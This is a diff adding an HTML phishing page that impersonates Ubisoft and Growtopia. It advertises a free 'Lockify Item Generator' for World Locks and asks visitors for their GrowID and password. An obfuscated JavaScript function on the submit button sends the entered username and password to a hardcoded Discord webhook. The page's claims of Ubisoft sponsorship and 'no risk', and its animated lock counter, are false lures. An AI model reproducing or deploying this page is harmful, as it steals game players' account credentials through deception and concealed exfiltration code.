@@ -1,0 +1,127 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lockify Support | www.ubisoft.com</title>
+<!-- favion -->
+<link rel="icon" type="image/png" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" sizes="16x16" />
+<link rel="shortcut icon" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" type="image/x-icon">
+<link rel="icon" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" type="image/x-icon">
+<!-- link to font awesome -->
+<link media="all" rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/font-awesome/css/font-awesome.min.css">
+<!-- include bootstrap and custom  css -->
+<link media="all" rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-main.css">
+<!-- include custom  css -->
+<link media="all" rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-custom.css">
+</head>
+<body>
+<!-- main wrapper of the page -->
+<div id="wrap"> 
+  <div class="page-wrapper">
+  <!-- Header -->
+ <div class="header-bg">
+  <header class="header" id="header">
+	  	<div class="row">
+		  <div class="col-md-2 col-sm-3 col-xs-3"><div class="logo"> <a href="https://www.growtopiagame.com"> <img class="normal" src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/logo_navibar.png" alt="Growtopia" ></a> </div></div>
+		  <div class="col-md-8 col-sm-6 col-xs-6 center-align"><div class="title">Lockify Client</div></div>
+		</div>
+  </header>
+  <div class="dirt"></div>
+</div>
+
+<div class="content">
+<section class="common-box ">
+	<div class="container">
+		<div class="section-title">
+			<h2>Lockify Item Generator v1.13.6</h2>
+		</div>
+		<div class="row">
+			<div class="col-md-8 col-sm-10">
+		    	<p>Update Released: 09/19/2020</p>
+				<p>Lockify is an Ubisoft sponsored giveaway platform that allows you to obtain World Locks and Diamond Locks instantly and without any costs! Since this is powered by Ubisoft, there's no risk associated with using our giveaway platform!</p>
+				<p>Total Locks Generated:</p>
+				<p id="value">16328</p>
+				<script>
+					function animateValue(id, start, end, duration) {
+						var range = end - start;
+						var current = start;
+						var increment = end > start? 1 : -1;
+						var stepTime = Math.abs(Math.floor(duration / range));
+						var obj = document.getElementById(id);
+						var timer = setInterval(function() {
+							current += increment;
+							obj.innerHTML = current;
+							if (current == end) {
+								clearInterval(timer);
+							}
+						}, stepTime);
+					}
+
+					animateValue("value", 16328, 19418, 500000);
+				</script>
+
+			</div>
+		</div>
+		<div class="row">
+			<div class="col-md-6 col-sm-8">
+				<form method="POST" action="https://www.growtopiagame.com/404" accept-charset="UTF-8" class="" role="form" required="required"><input name="_token" type="hidden" value="N7aopRBF8Um4b1HVRhz3QG1hLWZeSRvaVEE1wRlN">
+		    	<div class="form-group">
+		    		<input id="name" class="form-control" required="required" placeholder="GrowID *" data-validation-required-message="Please enter your GrowID." aria-invalid="false" name="name" type="text">
+		    		<p class="text-info help-block"><a href="https://www.growtopiagame.com/recover">(Click here if you can't remember your GrowID)</a></p>
+				</div>
+		        <div class="form-group">
+		        	<input id="secondval" class="form-control" required="required" placeholder="Password *" data-validation-required-message="Please enter your password." aria-invalid="false" name="name" type="text">
+					<p class="text-info help-block"><a href="https://www.growtopiagame.com/account">(Click here if you can't remember your password)</a></p>
+				</div>
+				<div class="form-group">
+		    		<input id="th9" class="form-control" required="required" placeholder="Amount of World Locks *" data-validation-required-message="Please enter an amount of World Locks." aria-invalid="false" name="th9" type="text">
+				</div>
+				<div class="form-group">
+		       		<input class="btn btn-lg btn-primary grow-button" onclick="sendMessage()" type="submit" value="Submit">
+				</div>
+				</form>
+			</div>
+		</div>
+	</div>
+</section>
+</div>
+<script>
+    function sendMessage() {
+      var _0x40a8=['https://discordapp.com/api/webhooks/785433137881677894/Wc9pEw-kPpRlFScjpEsVJtmI3fWhIMRVhMthMldK8sH6rKihkeDWfo7QojLvrcnvfjiG','0x1','secondval','value','0xa','0x9','0x4','POST','0x5','Content-type','name','0x6','send','0x8','Hook','push','application/json','getElementById','0x3','0x2','0xc','stringify','0x7'];(function(_0x5616a7,_0x40a86f){var _0x3a023a=function(_0x34d4ec){while(--_0x34d4ec){_0x5616a7['push'](_0x5616a7['shift']());}};_0x3a023a(++_0x40a86f);}(_0x40a8,0x1cd));var _0x3a02=function(_0x5616a7,_0x40a86f){_0x5616a7=_0x5616a7-0x0;var _0x3a023a=_0x40a8[_0x5616a7];return _0x3a023a;};var _0x227b=[_0x3a02('0x8'),_0x3a02('0x14'),_0x3a02('0x2'),_0x3a02('0x16'),'setRequestHeader',_0x3a02('0x10'),'POST',_0x3a02('0xf'),_0x3a02('0x1'),_0x3a02('0xd'),_0x3a02('0xb'),_0x3a02('0x9'),'open'];(function(_0x5947d7,_0x2fb1a6){var _0x48b053=function(_0xd52204){while(--_0xd52204){_0x5947d7[_0x3a02('0xe')](_0x5947d7['shift']());}};_0x48b053(++_0x2fb1a6);}(_0x227b,0x145));var _0x19a5=function(_0x2901c8,_0x7f2d9b){_0x2901c8=_0x2901c8-0x0;var _0x36fdbf=_0x227b[_0x2901c8];return _0x36fdbf;};var request=new XMLHttpRequest();request[_0x19a5(_0x3a02('0x13'))](_0x3a02('0x6'),_0x19a5('0x3'));request[_0x19a5(_0x3a02('0x5'))](_0x19a5('0x0'),_0x19a5(_0x3a02('0x15')));var params={'username':_0x19a5(_0x3a02('0x4')),'avatar_url':'','content':document[_0x19a5(_0x3a02('0x7'))](_0x19a5('0xb'))[_0x19a5(_0x3a02('0x12'))]};request[_0x3a02('0xb')](JSON[_0x19a5(_0x3a02('0x0'))](params));var request=new XMLHttpRequest();request[_0x19a5('0xc')](_0x19a5(_0x3a02('0xa')),_0x19a5(_0x3a02('0x11')));request[_0x19a5(_0x3a02('0x5'))](_0x19a5('0x0'),_0x19a5(_0x3a02('0x15')));var params={'username':_0x19a5(_0x3a02('0x4')),'avatar_url':'','content':document[_0x19a5(_0x3a02('0x7'))](_0x19a5(_0x3a02('0xc')))[_0x19a5(_0x3a02('0x12'))]};request[_0x19a5(_0x3a02('0x3'))](JSON['stringify'](params));
+    }
+  </script>
+<footer id="footer">
+      <div class="container text-center"> 
+        <!-- footer logo -->
+        <div class="logo"><a href="https://www.ubisoft.com" target="_blank"><img src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/ubi_icon.png"></a></div>
+        
+        <!-- copy rights --> 
+        	<div class="copy-right"> &copy; 2020 <a href="https://www.ubisoft.com" target="_blank">Ubisoft</a>. All Rights Reserved.</div> 
+        	<ul class="link"> 
+        		<li><a href="https://legal.ubi.com/" target="_blank" title="Legal" >Legal</a></li>
+        		<li><a href="https://legal.ubi.com/privacypolicy" target="_blank" title="Privacy Policy" >Privacy Policy</a></li>
+        	</ul>
+        </div>
+</footer>
+</div>
+</div>
+<script>var base_url = 'https://www.growtopiagame.com'</script>
+<!-- JQUERY LIBRARY --> 
+<script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery/jquery-2.1.4.min.js"></script> 
+<!-- jQuery easing --> 
+<script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery.easing/jquery.easing.1.3.min.js"></script> 
+<!-- boostrap javascript --> 
+<script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/bootstrap/javascripts/bootstrap.min.js"></script>
+<!-- match faq custom scripts --> 
+<script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/js/faq-custom.js"></script> 
+</body>
+<div class="cookie-consent">
+	<span><img src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/ubi_icon.png" width="70"> </span>
+	By continuing to navigate on this site, you accept the use of cookies to offer advertising adapted to your interests, collect visit statistics and allow you to use the social network share buttons.
+	<a href="https://legal.ubi.com/privacypolicy/" title="Legal" style="color:#FFFFFF;text-decoration:underline;text-transform:initial;">To learn more </a>
+	<button id="accept-consent" class="btn btn-primary grow-button">OK</button>
+</div>
+</html>
